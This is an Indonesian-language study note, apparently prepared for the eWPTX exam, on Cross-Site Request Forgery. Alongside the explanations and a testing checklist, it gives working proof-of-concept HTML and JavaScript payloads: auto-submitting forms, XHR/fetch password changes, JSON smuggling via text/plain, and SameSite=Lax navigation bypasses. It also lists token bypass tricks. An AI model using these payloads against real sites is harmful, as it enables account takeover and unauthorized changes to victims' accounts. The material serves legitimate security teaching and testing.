2026-02-04 17:44

Status:

Tags:[[eWPTX]] [[Authentication]] [[Session Management]] [[CSRF]]
###### Prasyarat: [[Session Management Testing]]
# Cross-Site Request Forgery (CSRF)

## Gambaran Singkat

CSRF terjadi ketika penyerang membuat browser korban mengirim request **yang mengubah state** (ubah email/password, transfer, dsb) ke aplikasi target **saat korban masih login**.

Yang dieksploitasi: browser akan otomatis menyertakan **cookie** (termasuk session cookie) setiap kali request menuju domain target, walaupun request itu dipicu dari situs lain.

---

## Alur Serangan Umum

1. Penyerang menemukan endpoint yang mengubah state dan tidak punya proteksi CSRF (mis. `POST /account/change-email`).
2. Penyerang membuat halaman berbahaya yang otomatis menembakkan request ke endpoint tersebut.
3. Korban yang sudah login dipancing membuka halaman berbahaya (phishing, iklan, posting forum, dll).
4. Browser korban mengirim request sambil membawa cookie sesi milik korban.
5. Server memprosesnya sebagai aksi sah karena sesi korban valid.

---

## Contoh Dampak

- Ubah email/password (bisa jadi rantai account takeover).
- Transaksi/transfer finansial.
- Mengubah setting akun/permission.
- Menambah akun admin yang dikontrol penyerang.
- Menjalankan aksi API “atas nama” user.

---

## Template HTML POC

### Auto-Submit Form (CSRF via POST)

POC CSRF paling umum: form tersembunyi yang auto-submit saat page load.

```html
<html>
<body>
  <form action="https://target.com/account/change-email" method="POST">
    <input type="hidden" name="email" value="evil@attacker.com" />
    <input type="hidden" name="confirm" value="1" />
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>
```

### Image Tag (CSRF via GET)

Kalau aplikasi (keliru) mengizinkan aksi mengubah state lewat GET, request bisa dipicu pakai tag gambar.

```html
<img src="https://target.com/api/change-email?email=evil@attacker.com" style="display:none" />
```

Ini otomatis terpanggil saat halaman dibuka, tanpa JavaScript.

### XHR-Based CSRF (XMLHttpRequest)

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/change-password", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("new_password=hacked123&confirm_password=hacked123");
</script>
```

### Fetch API CSRF

```html
<script>
fetch("https://target.com/api/change-password", {
  method: "POST",
  credentials: "include",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "new_password=hacked123&confirm_password=hacked123"
});
</script>
```

> Catatan: POC XHR/Fetch bisa kena **CORS preflight** untuk content type tertentu. Jika origin penyerang tidak di-allow, browser akan memblok request.

---

## JSON CSRF (Bypass Content-Type)

Banyak API modern meminta `Content-Type: application/json`. Biasanya ini memicu CORS preflight (`OPTIONS`) dan membuat CSRF lebih sulit. Tapi ada beberapa skenario bypass yang patut dites.

### Abuse `enctype` pada Form

Form HTML mendukung tiga nilai `enctype`. Dengan `text/plain`, payload bisa “diselundupkan” mirip JSON.

```html
<form action="https://target.com/api/update-profile" method="POST" enctype="text/plain">
  <input type="hidden" name='{"email":"evil@attacker.com","ignore":"' value='"}' />
</form>
<script>document.forms[0].submit();</script>
```

Body yang terkirim:

```
{"email":"evil@attacker.com","ignore":"="}
```

Ini bisa berhasil jika server tetap mem-parsing body sebagai JSON walaupun `Content-Type` tidak sesuai, atau mengizinkan `text/plain` untuk JSON parsing.

### Menggunakan `Navigator.sendBeacon`

```html
<script>
const blob = new Blob(['{"email":"evil@attacker.com"}'], { type: "application/json" });
navigator.sendBeacon("https://target.com/api/update-profile", blob);
</script>
```

`sendBeacon` mengirim POST dengan content type tertentu. Beberapa implementasi browser historis tidak selalu memicu preflight, tapi perilaku ini sudah banyak dipatch.

---

## Skenario Bypass SameSite Cookie

`SameSite` adalah pertahanan level browser untuk CSRF.

| Value    | Behavior                                                                 |
| -------- | ------------------------------------------------------------------------ |
| `Strict` | Cookie tidak pernah dikirim pada request cross-site.                     |
| `Lax`    | Cookie dikirim pada navigasi top-level (GET). Default di browser modern. |
| `None`   | Cookie selalu dikirim cross-site (wajib `Secure`).                       |

### Bypass SameSite=Lax

`Lax` masih mengizinkan cookie ikut pada **top-level GET navigation**. Kalau aplikasi menerima aksi state-changing via GET, CSRF masih mungkin.

```html
<!-- Top-level navigation triggers Lax cookie inclusion -->
<a href="https://target.com/account/change-role?role=admin" id="csrf-link">Click here</a>
<script>document.getElementById('csrf-link').click();</script>
```

Atau redirect full page:

```html
<script>window.location = "https://target.com/account/change-role?role=admin";</script>
```

### Skenario Bypass Lain

- **Subdomain takeover:** jika penyerang menguasai subdomain target (mis. `evil.target.com`), request bisa dianggap same-site.
- **Method override:** beberapa framework menerima aksi POST lewat GET jika ada parameter `_method=POST`.
- **2-minute Lax window:** Chromium pernah mengizinkan top-level POST dengan cookies untuk window tertentu ketika cookie diset tanpa SameSite eksplisit (kompatibilitas SSO).

---

## Teknik Bypass CSRF Token (Saat Token Ada)

Saat ada CSRF token, bukan berarti aman. Tes variasi bypass umum berikut.

### 1) Token kosong

Kirim request dengan `csrf_token=` kosong. Kadang server hanya cek parameter “ada”, bukan nilainya.

### 2) Hilangkan parameter token

Hapus parameter `csrf_token` sepenuhnya. Implementasi tertentu salah kaprah: kalau parameter tidak ada, validasi dilewati.

### 3) Token dari sesi lain

Pakai token dari sesi user berbeda. Kalau token tidak terikat sesi, token manapun bisa dipakai.

### 4) Replay token lama

Gunakan token yang pernah valid sebelumnya. Kalau tidak ada rotasi/invalidation, replay bisa berhasil.

### 5) Tukar HTTP method

Kalau POST memvalidasi token tapi action yang sama ada versi GET (yang tidak memvalidasi token), coba ubah method.

```
POST /change-email  (CSRF token required)
GET  /change-email?email=evil@attacker.com  (no CSRF token check)
```

### 6) Mismatch token cookie vs body

Kalau server membandingkan token cookie vs token body (double-submit), uji apakah cookie bisa dimanipulasi (mis. via subdomain) lalu dicocokkan dengan value body arbitrer.

---

## Checklist Pengujian

- **Token ada di setiap request state-changing?**
- **Token benar-benar divalidasi?** (bukan sekadar “parameter ada”)
- **Token terikat ke sesi?** (token sesi A tidak boleh berlaku di sesi B)
- **Rotasi token?** (per request/per sesi) dan apakah token bisa direplay
- **SameSite di cookie sesi?** (`Strict`/`Lax`/`None`)
- **Ada aksi state-changing via GET?** (ini red flag)
- **Enforcement Content-Type?** (ketat vs menerima `text/plain`/form-urlencoded)
- **Validasi Origin/Referer?** dan apakah bisa dibypass dengan menghilangkan header (mis. `<meta name="referrer" content="no-referrer">`)
- **Kebutuhan custom header?** (mis. `X-Requested-With`) yang sulit diset cross-origin tanpa CORS
